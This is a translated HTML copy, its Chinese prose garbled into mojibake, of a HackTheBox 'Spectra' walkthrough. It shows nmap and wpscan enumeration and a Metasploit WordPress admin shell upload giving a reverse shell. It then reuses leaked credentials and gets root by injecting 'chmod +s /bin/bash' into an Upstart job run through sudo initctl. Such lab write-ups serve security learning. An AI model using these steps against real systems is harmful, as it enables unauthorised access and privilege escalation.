<html>
<head>
<title>HackTheBox Writeup: Spectra</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é»‘å®¢ç›’å­æŠ¥é“:å…‰è°±</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/hackthebox-writeup-spectra-83ecdeeae568?source=collection_archive---------2-----------------------#2021-06-26">https://infosecwriteups.com/hackthebox-writeup-spectra-83ecdeeae568?source=collection_archive---------2-----------------------#2021-06-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/a370fa73feead037ddd9ebb05a2ce7f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Anf0Uo5_IhUmR9stwD_WCQ.png"/></div></div></figure><p id="6177" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">è¿™æ˜¯ä¸€ä¸ªç”±æ˜“åˆ°éš¾çš„ç›’å­ï¼Œè¦æ±‚æ”»å‡»è€…æšä¸¾ä¸€ä¸ªç½‘ç«™ï¼Œå¹¶æ‰¾åˆ°ä¸€ä¸ªå¸¦æœ‰éšè—å‡­æ®çš„æ–‡ä»¶æ¥è·å¾—ç«‹è¶³ç‚¹ã€‚ä¸ºäº†æå‡ç”¨æˆ·æƒé™ï¼Œæ”»å‡»è€…éœ€è¦æŸ¥æ‰¾åŒ…å«å‡­æ®çš„æ–‡ä»¶ã€‚æœ€åï¼Œä¸ºäº†è·å¾—rootæƒé™ï¼Œæ”»å‡»è€…å¿…é¡»åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶<em class="kw"> /sbin/initctlã€‚</em></p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="4067" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">åˆ—ä¸¾</h1><p id="0cd8" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">æˆ‘å¼€å§‹é€šè¿‡ç”¨<strong class="ka ir"> NMAP </strong>æ‰§è¡Œå¿«é€Ÿæ‰«ææ¥æšä¸¾ç›®æ ‡æœºå™¨ï¼Œä»¥è¯†åˆ«ä»»ä½•æ‰“å¼€çš„ç«¯å£:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="d378" class="mq lf iq mm b gy mr ms l mt mu">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.229</span><span id="c954" class="mq lf iq mm b gy mv ms l mt mu">PORT     STATE SERVICE REASON<br/>22/tcp   open  ssh     syn-ack ttl 63<br/>80/tcp   open  http    syn-ack ttl 63<br/>3306/tcp open  mysql   syn-ack ttl 63</span></pre><p id="2d1d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æ‰«æå‘ç°ä¸‰ä¸ªç«¯å£æ‰“å¼€(å³ç«¯å£22ã€80å’Œ3306)ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ¥è¯†åˆ«æ¯ä¸ªç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œå¹¶ä½¿ç”¨é€šç”¨NSEè„šæœ¬æ¥æŸ¥æ‰¾æˆ‘å¯ä»¥åˆ©ç”¨çš„ä»»ä½•å¸¸è§æ¼æ´:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="c5be" class="mq lf iq mm b gy mr ms l mt mu">nmap -sV -sC -Pn -v -p 22,80,3306 -oN nmap-report 10.10.10.229</span><span id="6a26" class="mq lf iq mm b gy mv ms l mt mu">PORT     STATE SERVICE VERSION<br/>22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)<br/>| ssh-hostkey: <br/>|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)<br/>80/tcp   open  http    nginx 1.17.4<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD<br/>|_http-server-header: nginx/1.17.4<br/>|_http-title: Site doesn't have a title (text/html).<br/>3306/tcp open  mysql   MySQL (unauthorized)</span></pre><p id="0ff9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç½‘ç«™è¢«æ‰˜ç®¡åœ¨80ç«¯å£ï¼Œå¹¶å†³å®šå¼€å§‹å¯»æ‰¾ä¸€ä¸ªåˆæ­¥çš„ç«‹è¶³ç‚¹ã€‚</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="71d5" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">HTTP â€”ç«¯å£80åˆ†æ</h1><p id="4c53" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">å¯¼èˆªåˆ°<a class="ae mw" href="http://10.10.10.229/" rel="noopener ugc nofollow" target="_blank"><em class="kw">http://10 . 10 . 10 . 229/</em></a>ï¼Œæ‰¾åˆ°å¦‚ä¸‹ç½‘é¡µ:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/ea1982d73038269e74cb34a6947dcc0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OMMtV7WnMtyvDccQMaegcw.png"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">ç´¢å¼•é¡µ</figcaption></figure><p id="c1d3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">å½“æˆ‘å°è¯•é¡µé¢ä¸Šçš„é“¾æ¥æ—¶ï¼Œæˆ‘æ”¶åˆ°ä¸€ä¸ªé”™è¯¯:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/984402602ae884f8d4e2c711f68d6bd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:894/format:webp/1*ZzKkqVCx6F6Me0jGRfM-DA.png"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">é”™è¯¯é¡µé¢</figcaption></figure><p id="2705" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘éœ€è¦å°†<strong class="ka ir"> spectra.htb </strong>æ·»åŠ åˆ°æˆ‘çš„<em class="kw"> /etc/hosts </em>æ–‡ä»¶ä¸­ã€‚æ·»åŠ åï¼Œæˆ‘å¯ä»¥å¯¼èˆªåˆ°ç½‘é¡µä¸Šçš„é“¾æ¥ã€‚è®¿é—®ç¬¬ä¸€ä¸ªé“¾æ¥æ—¶ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªWordPressç«™ç‚¹æ­£åœ¨è¿è¡Œ:</p><figure class="mh mi mj mk gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/36fa5d902716f40d39bda4140765d02a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tB9E-CP6V8d9wti2x0ivZQ.png"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">WordPressç½‘ç«™</figcaption></figure><p id="c80f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘å†³å®šä½¿ç”¨<strong class="ka ir"> wpscan </strong>ä¸ºç”¨æˆ·æšä¸¾ç½‘ç«™ï¼Œå¹¶æ‰¾åˆ°ä¸€ä¸ªåä¸º<strong class="ka ir"> administrator </strong>çš„ç”¨æˆ·:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="f1d1" class="mq lf iq mm b gy mr ms l mt mu">wpscan --url <a class="ae mw" href="http://10.10.10.229/main" rel="noopener ugc nofollow" target="_blank">http://10.10.10.229/main</a> -e u</span><span id="a6be" class="mq lf iq mm b gy mv ms l mt mu">[+] administrator<br/> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/> | Confirmed By: Login Error Messages (Aggressive Detection)</span></pre><p id="7a31" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘è¿˜è¯•å›¾åˆ—ä¸¾ç½‘ç«™ä¸Šä»»ä½•æ˜“å—æ”»å‡»çš„æ’ä»¶ï¼Œä½†è¿™å¹¶æ²¡æœ‰é€éœ²ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="492b" class="mq lf iq mm b gy mr ms l mt mu">wpscan --url <a class="ae mw" href="http://10.10.10.229/main" rel="noopener ugc nofollow" target="_blank">http://10.10.10.229/main</a> -e ap</span><span id="38a4" class="mq lf iq mm b gy mv ms l mt mu">[+] Enumerating All Plugins (via Passive Methods)</span><span id="a932" class="mq lf iq mm b gy mv ms l mt mu">[i] No plugins Found.</span></pre><p id="7c80" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘å†³å®šç»§ç»­å‰è¿›ï¼Œæ£€æŸ¥ä¹‹å‰åœ¨ç´¢å¼•é¡µé¢ä¸Šçœ‹åˆ°çš„<em class="kw"> /testing </em>é“¾æ¥ã€‚åœ¨æµ‹è¯•ç›®å½•ä¸­ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªåä¸º<strong class="ka ir"> wp-config.php.saveçš„æ–‡ä»¶ã€‚</strong>è¿™ä¸ªæ–‡ä»¶çœ‹èµ·æ¥æ˜¯ç©ºçš„ï¼Œä½†æ˜¯å¦‚æœæ‚¨æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œæ‚¨ä¼šçœ‹åˆ°å®ƒåŒ…å«ä¸€ä¸ªæ•°æ®åº“çš„å‡­è¯:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="dfef" class="mq lf iq mm b gy mr ms l mt mu">define( â€˜DB_NAMEâ€™, â€˜devâ€™ );</span><span id="7d62" class="mq lf iq mm b gy mv ms l mt mu">/** MySQL database username */<br/>define( â€˜DB_USERâ€™, â€˜devtestâ€™ );</span><span id="1fd8" class="mq lf iq mm b gy mv ms l mt mu">/** MySQL database password */<br/>define( â€˜DB_PASSWORDâ€™, â€˜devteam01â€™ );</span></pre><p id="39c1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘è¯•ç€ç”¨ä¸Šé¢æ‰¾åˆ°çš„å‡­è¯ç™»å½•åˆ°<strong class="ka ir"> MySQL </strong>æ•°æ®åº“å’Œ<strong class="ka ir">web-login.php</strong>ä½†æ˜¯å¤±è´¥äº†ã€‚æ ¹æ®ä¹‹å‰çš„WordPressæ‰«æï¼Œæˆ‘è¿˜çŸ¥é“å‘ç°äº†ä¸€ä¸ªåä¸º<strong class="ka ir"> administrator </strong>çš„ç”¨æˆ·åã€‚æˆ‘å°è¯•ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•web-login.phpé¡µé¢ï¼Œå¹¶è·å¾—æˆåŠŸ:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="75a0" class="mq lf iq mm b gy mr ms l mt mu"> administrator:devteam01</span></pre><p id="680e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘ä½¿ç”¨äº†<strong class="ka ir"> msfconsole </strong>æ¥è·å¾—ä¸€ä¸ªåå‘shell(åœ¨meterpreter shellå‡ºç°ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦é‡å¤å‡ æ¬¡):</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="570f" class="mq lf iq mm b gy mr ms l mt mu">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhosts 10.10.10.229<br/>rhosts =&gt; 10.10.10.229<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set password devteam01<br/>password =&gt; devteam01<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set username administrator<br/>username =&gt; devtest<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set targeturi /main<br/>targeturi =&gt; /main<br/>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span><span id="67b3" class="mq lf iq mm b gy mv ms l mt mu">meterpreter &gt;</span></pre><p id="182d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ä¸ºäº†å¾—åˆ°ä¸€ä¸ªåˆé€‚çš„shellï¼Œæˆ‘ä½¿ç”¨äº†<strong class="ka ir"> shell </strong>å‘½ä»¤ï¼Œç„¶ååˆ‡æ¢åˆ°<em class="kw"> /tmp </em>ç›®å½•ã€‚ç„¶åï¼Œæˆ‘ä½¿ç”¨pythonè·å¾—äº†ä¸€ä¸ªç¨³å®šçš„shell:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="f010" class="mq lf iq mm b gy mr ms l mt mu">cd /tmp<br/>python3 -c â€œimport pty;pty.spawn(â€˜/bin/bashâ€™)â€</span><span id="dc4a" class="mq lf iq mm b gy mv ms l mt mu">bash-4.3$</span></pre><p id="2a3e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘èŠ±äº†ä¸€äº›æ—¶é—´å¯»æ‰¾æå‡æƒé™çš„æ–¹æ³•ï¼Œæœ€ç»ˆï¼Œæˆ‘åœ¨<em class="kw"> /opt </em>ç›®å½•ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼Œåä¸º<strong class="ka ir"> autologin.conf.orig </strong>:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="55f9" class="mq lf iq mm b gy mr ms l mt mu"># Copyright 2016 The Chromium OS Authors. All rights reserved.<br/># Use of this source code is governed by a BSD-style license that can be<br/># found in the LICENSE file.<br/>description   "Automatic login at boot"<br/>author        "<a class="ae mw" href="mailto:chromium-os-dev@chromium.org" rel="noopener ugc nofollow" target="_blank">chromium-os-dev@chromium.org</a>"<br/># After boot-complete starts, the login prompt is visible and is accepting<br/># input.<br/>start on started boot-complete<br/>script<br/>  passwd=<br/>  # Read password from file. The file may optionally end with a newline.<br/>  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do<br/>    if [ -e "${dir}/passwd" ]; then<br/>      passwd="$(cat "${dir}/passwd")"<br/>      break<br/>    fi<br/>  done<br/>  if [ -z "${passwd}" ]; then<br/>    exit 0<br/>  fi<br/>  # Inject keys into the login prompt.<br/>  #<br/>  # For this to work, you must have already created an account on the device.<br/>  # Otherwise, no login prompt appears at boot and the injected keys do the<br/>  # wrong thing.<br/>  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter</span></pre><p id="9ba5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æµè§ˆå†…å®¹ï¼Œè„šæœ¬æ˜¾ç¤ºåœ¨<em class="kw">/mnt/stateful _ partition/etc/autolog in</em>ä¸­æœ‰ä¸€ä¸ªå¯†ç æ–‡ä»¶ã€‚å¯¼èˆªåˆ°è¿™ä¸ªä½ç½®ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªåä¸º<strong class="ka ir"> passwd </strong>çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå¯†ç :</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="187f" class="mq lf iq mm b gy mr ms l mt mu">bash-4.3$ cat passwd</span><span id="3c46" class="mq lf iq mm b gy mv ms l mt mu">SummerHereWeCome!!</span></pre><p id="0dd7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘å°è¯•ä»¥ä¸€ä¸ªç›®å½•åœ¨<em class="kw"> /home </em>çš„ç”¨æˆ·çš„èº«ä»½SSHåˆ°ç›®æ ‡æœºå™¨ï¼Œå¹¶ä¸”èƒ½å¤Ÿä»¥ç”¨æˆ·<strong class="ka ir"> katieçš„èº«ä»½ç™»å½•ã€‚</strong>ç„¶åæˆ‘å°±å¯ä»¥è·å¾—ç”¨æˆ·æ ‡å¿—äº†:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="ba0e" class="mq lf iq mm b gy mr ms l mt mu">$ ssh katie@10.10.10.229</span><span id="fa2c" class="mq lf iq mm b gy mv ms l mt mu">-bash-4.3$ whoami<br/>katie</span><span id="5420" class="mq lf iq mm b gy mv ms l mt mu">-bash-4.3$ cat user.txt<br/>e89d27fe195e........</span></pre></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="3cb8" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">æƒé™æå‡</h1><p id="bdec" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">æˆ‘æ£€æŸ¥äº†ç”¨æˆ·<strong class="ka ir"> katie </strong>å¯ä»¥ä½¿ç”¨rootæƒé™è¿è¡Œå“ªäº›å‘½ä»¤ï¼Œå‘ç°ç”¨æˆ·å¯ä»¥åœ¨æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹ä»¥rootèº«ä»½è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶<em class="kw"> /sbin/initctl </em>:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="2ed5" class="mq lf iq mm b gy mr ms l mt mu">$ sudo -l</span><span id="7493" class="mq lf iq mm b gy mv ms l mt mu">User katie may run the following commands on spectra:<br/>    (ALL) SETENV: NOPASSWD: /sbin/initctl</span></pre><p id="ca83" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ä»¥ä¸‹é“¾æ¥å¾ˆå¥½åœ°è§£é‡Šäº†å¦‚ä½•åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æå‡æƒé™:</p><div class="ne nf gp gr ng nh"><a href="https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9" rel="noopener follow" target="_blank"><div class="ni ab fo"><div class="nj ab nk cl cj nl"><h2 class="bd ir gy z fp nm fr fs nn fu fw ip bi translated">initctlçš„SUDOæƒé™|æƒé™æå‡æŠ€æœ¯| Ishara Abeythissa</h2><div class="no l"><h3 class="bd b gy z fp nm fr fs nn fu fw dk translated">initctlå…è®¸ç³»ç»Ÿç®¡ç†å‘˜ä¸Upstarté“¾æ¥å’Œé€šä¿¡ã€‚èƒ½å¤Ÿç®¡ç†ç”¨æˆ·ä½œä¸šã€‚ä½œä¸ºä¾‹å­ï¼Œå¦‚æœâ€¦</h3></div><div class="np l"><p class="bd b dl z fp nm fr fs nn fu fw dk translated">isharaabeythissa.medium.com</p></div></div><div class="nq l"><div class="nr l ns nt nu nq nv jw nh"/></div></div></a></div><p id="bffd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘é¦–å…ˆæ£€æŸ¥äº†ä½äº<strong class="ka ir"> /etc/init </strong>ç›®å½•ä¸­çš„å“ªäº›é…ç½®æ–‡ä»¶å¯ä»¥æ³¨å…¥æ¶æ„ä»£ç :</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="8d23" class="mq lf iq mm b gy mr ms l mt mu">-rw-rw----  1 root developers   478 Jun 29  2020 test.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test1.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test10.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test2.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test3.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test4.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test5.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test6.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test7.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test8.conf<br/>-rw-rw----  1 root developers   478 Jun 29  2020 test9.conf</span></pre><p id="62c9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æµè§ˆè¿™äº›æ–‡ä»¶ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ç”¨æˆ·katieå¯ä»¥å†™å…¥ä¸Šé¢åˆ—å‡ºçš„æ–‡ä»¶ï¼Œå› ä¸ºè¯¥ç”¨æˆ·å±äºdevelopersç»„:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="baa6" class="mq lf iq mm b gy mr ms l mt mu">$ id</span><span id="88fe" class="mq lf iq mm b gy mv ms l mt mu">uid=20156(katie)gid=20157(katie)groups=20157(katie),20158(developer)</span></pre><p id="8bc0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘æ³¨å…¥äº†ä¸€äº›ä»£ç ï¼Œä¸ºæ‰€æœ‰ç”¨æˆ·è®¾ç½®äº†SUIDæƒé™<strong class="ka ir"> /bin/bash </strong>ï¼Œå¹¶å…è®¸æˆ‘ä»¥rootç”¨æˆ·èº«ä»½æ¥ç®¡bash shell:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="5d40" class="mq lf iq mm b gy mr ms l mt mu">echo "script<br/>&gt; <br/>&gt;     chmod +s /bin/bash<br/>&gt; <br/>&gt; end script" &gt;&gt; test.conf</span></pre><p id="8117" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç„¶åï¼Œæˆ‘ç”¨rootæƒé™å¯åŠ¨äº†<strong class="ka ir">æµ‹è¯•</strong>æœåŠ¡ï¼Œå¹¶å¯åŠ¨äº†bash:</p><pre class="mh mi mj mk gt ml mm mn mo aw mp bi"><span id="2bc7" class="mq lf iq mm b gy mr ms l mt mu">$ sudo /sbin/initctl start test<br/>test start/running, process 4877</span><span id="69a7" class="mq lf iq mm b gy mv ms l mt mu"># -p option lets bash keep the effective userid it is launched with, wheras without it, it will set the effective uid to the actual uid (your user).</span><span id="d9c9" class="mq lf iq mm b gy mv ms l mt mu">$ /bin/bash -p<br/>bash-4.3#</span><span id="17f9" class="mq lf iq mm b gy mv ms l mt mu">bash-4.3# cat /root/root.txt<br/>d44519713b88.........</span></pre><p id="0de1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">åœ¨å¾—åˆ°ä¸€ä¸ªæ ¹shellä¹‹åï¼Œæˆ‘èƒ½å¤Ÿå¾—åˆ°æ ¹æ ‡å¿—ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç¥ä½ é»‘å®¢å¿«ä¹ğŸ˜„ï¼</p></div></div>    
</body>
</html>